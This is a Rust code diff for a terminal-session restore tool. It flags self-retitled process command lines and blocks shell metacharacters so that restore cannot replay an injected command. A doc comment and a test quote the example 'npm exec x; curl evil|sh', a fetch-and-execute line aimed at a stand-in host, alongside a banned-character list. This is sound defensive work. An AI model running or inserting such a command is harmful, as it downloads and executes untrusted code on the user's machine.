@@ -10,14 +10,30 @@ const SHELLS: &[&str] = &["bash", "zsh", "fish", "sh", "dash", "ksh", "tcsh", "c
 /// (nvim, ssh, npm, …) — **not** any deeper descendant that program spawned
 /// (an editor's LSP server, a tool's worker, …). Returns `None` for a bare
 /// shell.
-pub fn foreground_command(pane_pid: i32) -> Option<String> {
+///
+/// The `bool` is `true` for a *verbatim* command line: a single-element
+/// cmdline (setproctitle-rewritten) emitted unquoted. Verbatim lines are the
+/// injection-persistence vector — a process can retitle itself to
+/// `npm exec x; curl evil|sh` — so capture gates them on [`verbatim_safe`].
+pub fn foreground_command(pane_pid: i32) -> Option<(String, bool)> {
     let child = newest_child(pane_pid)?;
-    let cmd = cmdline(child)?;
+    let (cmd, verbatim) = cmdline(child)?;
     if SHELLS.contains(&base_name(&cmd)) {
         None
     } else {
-        Some(cmd)
+        Some((cmd, verbatim))
     }
+}
+
+/// Shell metacharacters banned from a verbatim (single-element) cmdline that
+/// restore would type into a shell. Multi-element argv is exempt: each
+/// element is shell-quoted on reconstruction, so metacharacters there are
+/// inert data (the remote command in `ssh host "a || b"`).
+const VERBATIM_BANNED: &[char] = &[';', '|', '&', '$', '`', '>', '<', '(', ')', '\n'];
+
+/// Whether a verbatim cmdline is safe to replay into a shell.
+pub fn verbatim_safe(line: &str) -> bool {
+    !line.contains(VERBATIM_BANNED)
 }
 
 /// The basename of the program in a command line.
@@ -35,7 +51,7 @@ fn newest_child(pid: i32) -> Option<i32> {
         .max()
 }
 
-fn cmdline(pid: i32) -> Option<String> {
+fn cmdline(pid: i32) -> Option<(String, bool)> {
     let raw = fs::read(format!("/proc/{pid}/cmdline")).ok()?;
     reconstruct(&raw)
 }
@@ -53,8 +69,10 @@ fn cmdline(pid: i32) -> Option<String> {
 /// process that rewrote its own cmdline into one whole command string
 /// (setproctitle — e.g. npm/node: `npm exec @anthropic-ai/claude-code`). That
 /// is a command line, not one argument, so quoting it would collapse it into a
-/// single bogus word ("no such file or directory").
-fn reconstruct(raw: &[u8]) -> Option<String> {
+/// single bogus word ("no such file or directory"). The second tuple element
+/// flags this verbatim case — such lines carry no quoting, so downstream must
+/// vet them (`verbatim_safe`) before replaying them into a shell.
+fn reconstruct(raw: &[u8]) -> Option<(String, bool)> {
     let parts: Vec<String> = raw
         .split(|b| *b == 0)
         .filter(|p| !p.is_empty())
@@ -62,14 +80,15 @@ fn reconstruct(raw: &[u8]) -> Option<String> {
         .collect();
     match parts.len() {
         0 => None,
-        1 => parts.into_iter().next().map(|s| normalize_launcher(&s)),
-        _ => Some(
+        1 => parts.into_iter().next().map(|s| (normalize_launcher(&s), true)),
+        _ => Some((
             parts
                 .iter()
                 .map(|p| shell_quote(p))
                 .collect::<Vec<_>>()
                 .join(" "),
-        ),
+            false,
+        )),
     }
 }
 
@@ -164,7 +183,7 @@ mod tests {
         // The bug returned the bare grandchild ("sleep 3"); the fix returns the
         // program ("python3 -c ..."). (The python source mentions "sleep", so
         // assert on the leading program name rather than absence of "sleep".)
-        let got = got.unwrap_or_default();
+        let got = got.map(|(cmd, _)| cmd).unwrap_or_default();
         assert!(
             got.starts_with("python3"),
             "expected the foreground program (python3 …), got: {got:?}"
@@ -178,20 +197,21 @@ mod tests {
     #[test]
     fn preserves_quoting_of_args_with_metacharacters() {
         let raw = b"ssh\0grid\0-t\0byobu has -t k || byobu new -s k && byobu a -t k\0";
-        let got = reconstruct(raw).unwrap();
+        let (got, verbatim) = reconstruct(raw).unwrap();
         assert_eq!(got, "ssh grid -t 'byobu has -t k || byobu new -s k && byobu a -t k'");
+        assert!(!verbatim, "a real multi-element argv is not verbatim");
     }
 
     #[test]
     fn leaves_simple_args_unquoted() {
         let raw = b"npm\0run\0dev\0";
-        assert_eq!(reconstruct(raw).unwrap(), "npm run dev");
+        assert_eq!(reconstruct(raw).unwrap(), ("npm run dev".to_string(), false));
     }
 
     #[test]
     fn escapes_embedded_single_quotes() {
         let raw = b"sh\0-c\0echo 'hi'\0";
-        assert_eq!(reconstruct(raw).unwrap(), r#"sh -c 'echo '\''hi'\'''"#);
+        assert_eq!(reconstruct(raw).unwrap().0, r#"sh -c 'echo '\''hi'\'''"#);
     }
 
     // npm/node rewrite argv into one space-joined string (setproctitle), padded
@@ -203,7 +223,7 @@ mod tests {
     fn npm_exec_reinserts_dropped_separator() {
         let raw = b"npm exec @anthropic-ai/claude-code -r --dangerously-skip-permissions\0\0\0";
         assert_eq!(
-            reconstruct(raw).unwrap(),
+            reconstruct(raw).unwrap().0,
             "npm exec @anthropic-ai/claude-code -- -r --dangerously-skip-permissions"
         );
     }
@@ -212,7 +232,7 @@ mod tests {
     fn npm_exec_without_args_is_unchanged() {
         let raw = b"npm exec @anthropic-ai/claude-code\0\0";
         assert_eq!(
-            reconstruct(raw).unwrap(),
+            reconstruct(raw).unwrap().0,
             "npm exec @anthropic-ai/claude-code"
         );
     }
@@ -220,24 +240,49 @@ mod tests {
     #[test]
     fn npm_exec_with_existing_separator_is_unchanged() {
         let raw = b"npm exec pkg -- --flag\0";
-        assert_eq!(reconstruct(raw).unwrap(), "npm exec pkg -- --flag");
+        assert_eq!(reconstruct(raw).unwrap().0, "npm exec pkg -- --flag");
     }
 
     #[test]
     fn npx_form_also_gets_separator() {
         let raw = b"npx some-cli --watch\0\0";
-        assert_eq!(reconstruct(raw).unwrap(), "npx some-cli -- --watch");
+        assert_eq!(reconstruct(raw).unwrap().0, "npx some-cli -- --watch");
     }
 
-    // A non-launcher single element (e.g. a self-retitled daemon) is untouched.
+    // A non-launcher single element (e.g. a self-retitled daemon) is untouched
+    // — and flagged as verbatim, so capture can vet it before replay.
     #[test]
     fn non_launcher_single_element_is_verbatim() {
         let raw = b"postgres: writer process\0\0";
-        assert_eq!(reconstruct(raw).unwrap(), "postgres: writer process");
+        assert_eq!(
+            reconstruct(raw).unwrap(),
+            ("postgres: writer process".to_string(), true)
+        );
     }
 
     #[test]
     fn empty_cmdline_is_none() {
         assert_eq!(reconstruct(b""), None);
+    }
+
+    // ── verbatim replay safety (setproctitle injection) ─────────────────────
+
+    #[test]
+    fn verbatim_safe_accepts_ordinary_command_lines() {
+        assert!(verbatim_safe("nvim file.txt"));
+        assert!(verbatim_safe("npm exec @anthropic-ai/claude-code -- -r"));
+        assert!(verbatim_safe("ssh host"));
+    }
+
+    #[test]
+    fn verbatim_safe_rejects_shell_metacharacters() {
+        // The persistence vector: a process retitles itself so restore types
+        // a compound command into a fresh shell.
+        assert!(!verbatim_safe("npm exec x; curl evil|sh"));
+        for line in [
+            "a;b", "a|b", "a&b", "a$b", "a`b`", "a>b", "a<b", "a(b", "a)b", "a\nb",
+        ] {
+            assert!(!verbatim_safe(line), "{line:?} must be rejected");
+        }
     }
 }
